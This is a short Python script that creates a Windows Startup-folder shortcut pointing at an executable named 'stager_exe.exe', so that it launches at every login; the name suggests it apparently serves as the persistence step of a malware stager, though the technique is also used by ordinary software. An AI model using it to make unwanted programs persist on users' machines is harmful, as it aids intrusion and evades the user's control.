import os
from win32com.client import Dispatch  # Add this to use Windows COM for shortcuts

def add_to_startup():
    # Get the user's Startup folder path
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

    # Use a relative path to your executable (relative from where the script is being run)
    script_path = "dist/stager_exe.exe"  # Relative path from the current working directory

    # Create a shortcut
    shortcut_path = os.path.join(startup_folder, "MyAppShortcut.lnk")

    # Use COM to create the shortcut
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    
    # Set the target to your .exe file
    shortcut.TargetPath = os.path.abspath(script_path)  # Absolute path to the .exe file
    shortcut.WorkingDirectory = os.path.dirname(os.path.abspath(script_path))  # Working directory of the .exe
    shortcut.IconLocation = os.path.abspath(script_path)  # Use .exe file icon (you can customize this with a different icon)
    
    shortcut.save()

    print("Added to startup!")

add_to_startup()
